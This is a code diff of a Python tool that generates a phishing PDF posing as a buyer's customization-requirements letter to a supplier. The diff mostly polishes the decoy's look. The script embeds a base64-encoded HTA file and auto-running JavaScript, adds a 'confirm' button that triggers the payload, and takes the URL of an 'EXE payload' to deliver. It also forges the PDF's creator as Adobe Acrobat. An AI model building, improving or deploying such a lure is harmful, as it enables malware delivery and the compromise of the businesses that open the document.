@@ -2,30 +2,22 @@
 # -*- coding: utf-8 -*-
 """
 ================================================================================
-V303 "THE SUPPLIER CONFIRMATION" – REPORTLAB + PIKEPDF HYBRID (FINAL FIXED)
+V305 "THE SUPPLIER CONFIRMATION" – PROFESSIONAL PREMIUM HYBRID PDF
 ================================================================================
 (c) 2026 The Architect. For Educational and Defensive Research Only.
 ================================================================================
 """
 
-import sys
-import os
-import base64
-import random
-import string
-import argparse
-import datetime
-import logging
-import tempfile
+import sys, os, base64, random, string, argparse, datetime, logging, tempfile
 from reportlab.lib.pagesizes import A4
 from reportlab.pdfgen import canvas
 from reportlab.lib import colors
 from reportlab.platypus import Table, TableStyle
 import pikepdf
-from pikepdf import String, Array
+from pikepdf import String, Array, Dictionary, Name, Stream
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
-logger = logging.getLogger("V303_SUPPLIER_CONFIRMATION")
+logger = logging.getLogger("V305_SUPPLIER_CONFIRMATION")
 
 def random_str(length=8):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
@@ -66,7 +58,7 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     hta_b64 = base64.b64encode(hta_content.encode('utf-8')).decode('ascii')
     hta_filename = f"{random_str(4)}.hta"
 
-    # JavaScript document‑level function
+    # JavaScript document-level function
     js_code = f"""
     function b64Decode(data) {{
         var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -169,7 +161,7 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     } catch(e) {}
     """
 
-    # ---------- Step 1: Generate base PDF with reportlab ----------
+    # ---------- Step 1: Generate base PDF with reportlab (premium design) ----------
     with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tmp:
         base_pdf_path = tmp.name
 
@@ -177,30 +169,70 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     width, height = A4
     margin = 50
 
-    # Page 1
-    c.setFillColor(colors.HexColor("#0a1a33"))
-    c.rect(0, height-20, width, 5, fill=1)
+    # Color palette
+    primary_dark = colors.HexColor("#0B1E3B")
+    primary_mid = colors.HexColor("#1E3A6E")
+    accent = colors.HexColor("#2E75B6")
+    light_bg = colors.HexColor("#F5F8FC")
+    white = colors.white
+    gray_light = colors.HexColor("#E0E6ED")
+    gray_dark = colors.HexColor("#666666")
+    green = colors.HexColor("#2E8B57")
+    red = colors.HexColor("#B22222")
 
-    c.setFillColor(colors.HexColor("#d9e2ef"))
-    c.rect(margin, height-40, 120, 30, fill=1, stroke=1)
-    c.setFillColor(colors.HexColor("#0a1a33"))
-    c.setFont("Helvetica-Bold", 12)
-    c.drawString(margin+5, height-30, buyer[:15])
+    # === PAGE 1 ===
+    # Background
+    c.setFillColor(light_bg)
+    c.rect(0, 0, width, height, fill=1, stroke=0)
 
-    c.setFillColor(colors.HexColor("#d9e2ef"))
-    c.rect(width-margin-100, height-45, 90, 25, fill=1, stroke=1)
-    c.setFillColor(colors.HexColor("#0a1a33"))
-    c.setFont("Helvetica-Bold", 8)
-    c.drawString(width-margin-70, height-35, "Secured")
+    # Header band
+    c.setFillColor(primary_dark)
+    c.rect(0, height-90, width, 90, fill=1, stroke=0)
 
-    c.setFillColor(colors.black)
-    c.setFont("Helvetica-Bold", 24)
-    c.drawString(margin, height-100, "Customization Requirements Specification")
+    # Subtle accent line under header
+    c.setFillColor(accent)
+    c.rect(0, height-94, width, 4, fill=1, stroke=0)
 
-    c.setFont("Helvetica", 12)
-    c.drawString(margin, height-150, f"Dear {supplier} Team,")
+    # Company "logo" – simple geometric mark
+    c.setFillColor(white)
+    c.circle(75, height-45, 20, fill=1, stroke=0)
+    c.setFillColor(primary_mid)
+    c.circle(75, height-45, 14, fill=1, stroke=0)
+    c.setFillColor(white)
+    c.setFont("Helvetica-Bold", 16)
+    c.drawString(68, height-52, "G")
+    c.setFont("Helvetica-Bold", 14)
+    c.drawString(105, height-50, buyer[:20].upper())
+    c.setFont("Helvetica", 8)
+    c.drawString(105, height-62, "Global Procurement Division")
+
+    # "Secured" badge on right
+    c.setFillColor(primary_mid)
+    c.roundRect(width-120, height-65, 100, 30, 15, fill=1, stroke=0)
+    c.setFillColor(white)
+    c.setFont("Helvetica-Bold", 9)
+    c.drawCentredString(width-70, height-52, "🔒 Secured")
+
+    # Title block
+    c.setFillColor(primary_dark)
+    c.setFont("Helvetica-Bold", 26)
+    c.drawString(margin, height-150, "Customization Requirements")
+    c.drawString(margin, height-180, "Specification")
     c.setFont("Helvetica", 11)
-    y = height-180
+    c.setFillColor(gray_dark)
+    c.drawString(margin, height-205, "A formal request from the buyer to the supplier for product customization.")
+
+    # Decorative divider
+    c.setStrokeColor(accent)
+    c.setLineWidth(1.5)
+    c.line(margin, height-215, width-margin, height-215)
+
+    # Letter content
+    c.setFillColor(colors.black)
+    c.setFont("Helvetica", 12)
+    c.drawString(margin, height-250, f"Dear {supplier} Team,")
+    c.setFont("Helvetica", 11)
+    y = height-280
     lines = [
         "We have finalized our customization requirements for the product. Please find",
         "the detailed specifications on the next page. Kindly review and confirm your",
@@ -209,38 +241,64 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     ]
     for line in lines:
         c.drawString(margin, y, line)
-        y -= 15
-    y -= 10
+        y -= 18
+
+    # Document details card
+    card_x = margin
+    card_y = y - 40
+    card_w = width - 2*margin
+    card_h = 100
+    c.setFillColor(white)
+    c.roundRect(card_x, card_y, card_w, card_h, 10, fill=1, stroke=0)
+    c.setStrokeColor(gray_light)
+    c.roundRect(card_x, card_y, card_w, card_h, 10, fill=0, stroke=1)
 
     date_str = datetime.datetime.now().strftime("%B %d, %Y")
     doc_no = f"REQ-{random_str(6).upper()}"
     expiry = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%B %d, %Y")
 
-    c.setFont("Helvetica-Bold", 11)
-    c.setFillColor(colors.HexColor("#0a1a33"))
-    c.drawString(margin, y, f"Document No.: {doc_no}")
-    y -= 20
-    c.setFont("Helvetica", 11)
+    c.setFillColor(primary_dark)
+    c.setFont("Helvetica-Bold", 10)
+    c.drawString(card_x+20, card_y+75, "Document No.")
+    c.drawString(card_x+200, card_y+75, "Date")
+    c.drawString(card_x+380, card_y+75, "Product")
     c.setFillColor(colors.black)
-    c.drawString(margin, y, f"Date: {date_str}")
-    y -= 20
-    c.drawString(margin, y, f"Product: {product} v{version}")
-    y -= 20
-    c.drawString(margin, y, f"Response Due: {expiry}")
+    c.setFont("Helvetica", 11)
+    c.drawString(card_x+20, card_y+55, doc_no)
+    c.drawString(card_x+200, card_y+55, date_str)
+    c.drawString(card_x+380, card_y+55, f"{product} v{version}")
+    c.setFillColor(primary_dark)
+    c.setFont("Helvetica-Bold", 10)
+    c.drawString(card_x+20, card_y+30, "Response Due")
+    c.setFillColor(colors.black)
+    c.setFont("Helvetica", 11)
+    c.drawString(card_x+20, card_y+10, expiry)
 
+    # Footer
+    c.setFillColor(gray_dark)
     c.setFont("Helvetica", 8)
-    c.setFillColor(colors.gray)
-    c.drawString(margin, 30, "This document contains proprietary information. Please confirm receipt and compliance.")
+    c.drawString(margin, 40, "This document contains proprietary information. Please confirm receipt and compliance.")
+    c.drawString(margin, 25, f"{buyer} | procurement@{buyer.lower().replace(' ', '')}.com | +1 (555) 123-4567")
 
-    # Page 2
+    # === PAGE 2 ===
     c.showPage()
-    c.setFont("Helvetica-Bold", 20)
-    c.setFillColor(colors.black)
-    c.drawString(margin, height-50, "Detailed Customization Requirements")
-    c.setFont("Helvetica", 11)
-    c.setFillColor(colors.gray)
-    c.drawString(margin, height-70, f"Document No.: {doc_no}  |  Date: {date_str}")
+    # Background
+    c.setFillColor(light_bg)
+    c.rect(0, 0, width, height, fill=1, stroke=0)
 
+    # Header band smaller
+    c.setFillColor(primary_dark)
+    c.rect(0, height-50, width, 50, fill=1, stroke=0)
+    c.setFillColor(accent)
+    c.rect(0, height-54, width, 4, fill=1, stroke=0)
+    c.setFillColor(white)
+    c.setFont("Helvetica-Bold", 16)
+    c.drawString(margin, height-35, "Detailed Customization Requirements")
+    c.setFont("Helvetica", 9)
+    c.setFillColor(gray_dark)
+    c.drawString(margin, height-65, f"Document No.: {doc_no}  |  Date: {date_str}")
+
+    # Requirements table with premium styling
     data = [
         ["Category", "Requirement", "Status", "Priority"],
         ["Specifications", "Product dimensions: 120mm x 80mm x 45mm (±0.5mm)", "Required", "High"],
@@ -256,33 +314,37 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
         ["Compliance", "RoHS and REACH compliance certificates", "Required", "High"],
         ["Compliance", "Conflict-free minerals declaration", "Required", "Medium"],
     ]
-    table = Table(data, colWidths=[80, 200, 60, 60])
+
+    # Adjust column widths for better fit
+    table = Table(data, colWidths=[80, 210, 70, 60])
     table.setStyle(TableStyle([
-        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#0a1a33")),
-        ('TEXTCOLOR', (0,0), (-1,0), colors.white),
+        ('BACKGROUND', (0,0), (-1,0), primary_dark),
+        ('TEXTCOLOR', (0,0), (-1,0), white),
         ('ALIGN', (0,0), (-1,-1), 'CENTER'),
+        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
         ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
         ('FONTSIZE', (0,0), (-1,0), 10),
-        ('BOTTOMPADDING', (0,0), (-1,0), 8),
-        ('BACKGROUND', (0,1), (-1,-1), colors.white),
-        ('GRID', (0,0), (-1,-1), 0.5, colors.gray),
+        ('BOTTOMPADDING', (0,0), (-1,0), 10),
+        ('TOPPADDING', (0,0), (-1,0), 10),
+        ('BACKGROUND', (0,1), (-1,-1), white),
+        ('GRID', (0,0), (-1,-1), 0.5, gray_light),
         ('FONTNAME', (0,1), (-1,-1), 'Helvetica'),
         ('FONTSIZE', (0,1), (-1,-1), 9),
-        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
+        ('ROWBACKGROUNDS', (0,1), (-1,-1), [white, colors.HexColor("#F9FBFD")]),
     ]))
-    table.wrapOn(c, width-2*margin, height-200)
-    table.drawOn(c, margin, height-170 - table._height)
+    table.wrapOn(c, width-2*margin, height-250)
+    table.drawOn(c, margin, height-300)
 
+    # Footer
+    c.setFillColor(gray_dark)
     c.setFont("Helvetica", 8)
-    c.setFillColor(colors.gray)
-    c.drawString(margin, 30, "Please confirm your ability to meet these requirements by clicking the button on page 1.")
+    c.drawString(margin, 40, "Please confirm your ability to meet these requirements by clicking the button on page 1.")
     c.save()
     logger.info(f"[+] Base PDF generated: {base_pdf_path}")
 
     # ---------- Step 2: Add interactive elements with pikepdf ----------
     pdf = pikepdf.open(base_pdf_path)
 
-    # JavaScript name tree – use plain strings for keys
     pdf.Root["/Names"] = pdf.make_indirect({
         "/JavaScript": pdf.make_indirect({
             "/Names": Array([
@@ -292,46 +354,91 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
         })
     })
 
-    # OpenAction – browser decoy
     pdf.Root["/OpenAction"] = pdf.make_indirect({
         "/S": "/JavaScript",
         "/JS": String(browser_js)
     })
 
-    # Button on page 1 (index 0)
+    # Button on page 1 – centered, premium look
     page1 = pdf.pages[0]
+    btn_width = 260
+    btn_height = 42
+    btn_x = (595 - btn_width) // 2
+    btn_y = 180
+
+    helv_font = pdf.make_indirect({
+        "/Type": "/Font",
+        "/Subtype": "/Type1",
+        "/BaseFont": "/Helvetica"
+    })
+
     button = {
         "/Type": "/Annot",
         "/Subtype": "/Widget",
         "/FT": "/Btn",
         "/T": String("ConfirmButton"),
-        "/Rect": [100, 330, 495, 390],
+        "/Ff": 65536,
+        "/Rect": [btn_x, btn_y, btn_x + btn_width, btn_y + btn_height],
         "/F": 4,
-        "/BS": {"/S": "/S", "/W": 2, "/BC": [0.2, 0.5, 0.7]},
+        "/BS": {"/S": "/S", "/W": 1, "/BC": [0.2, 0.5, 0.7]},
         "/MK": {"/BG": [0.15, 0.45, 0.7], "/CA": String(button_label)},
         "/AA": {
             "/U": {"/S": "/JavaScript", "/JS": String("this.doc.trigger();")}
-        }
+        },
+        "/H": "/P",
+        "/DA": "/Helv 12 Tf 1 1 1 rg",
+        "/DR": {"/Font": {"/Helv": helv_font}},
+        "/P": page1,
+        "/AP": {}
     }
+
+    # Premium appearance stream with gradient-like effect and shadow
+    ap_content = f"""
+    q
+    % Shadow
+    0.7 0.7 0.7 rg
+    1 1 1 1 re
+    % Main button (rounded rectangle simulated by overlapping)
+    0.15 0.45 0.7 rg
+    2 2 {btn_width-4} {btn_height-4} re f
+    % Highlight top
+    0.25 0.55 0.8 rg
+    2 {btn_height-12} {btn_width-4} 10 re f
+    Q
+    BT
+    /Helv 12 Tf
+    1 1 1 rg
+    {btn_x + btn_width/2} {btn_y + btn_height/2} Tm
+    ({button_label}) Tj
+    ET
+    """
+    ap_stream = pdf.make_indirect(Stream(pdf, ap_content.encode('utf-8')))
+    button["/AP"] = {"/N": ap_stream}
+
     button_obj = pdf.make_indirect(button)
+
     if "/Annots" in page1:
         page1["/Annots"].append(button_obj)
     else:
         page1["/Annots"] = Array([button_obj])
 
-    # Metadata
+    acroform = pdf.make_indirect({
+        "/Fields": Array([button_obj]),
+        "/DA": String("/Helv 0 Tf 0 g"),
+        "/NeedAppearances": False
+    })
+    pdf.Root["/AcroForm"] = acroform
+
     pdf.docinfo["/Title"] = String(f"Customization Requirements – {product} (v{version})")
     pdf.docinfo["/Author"] = String(buyer)
     pdf.docinfo["/Creator"] = String("Adobe Acrobat Pro DC")
 
     pdf.save(output_path, compress_streams=False)
     logger.info(f"[+] Final PDF saved: {output_path}")
-
-    # Cleanup
     os.unlink(base_pdf_path)
 
 def main():
-    parser = argparse.ArgumentParser(description="V303 Supplier Confirmation – Hybrid generator")
+    parser = argparse.ArgumentParser(description="V305 Supplier Confirmation – Premium hybrid generator")
     parser.add_argument("-o", "--output", default="requirements.pdf", help="Output PDF filename")
     parser.add_argument("-u", "--url", required=True, help="URL of the final EXE payload")
     parser.add_argument("-f", "--fallback", help="Fallback URL (default: same as -u)")
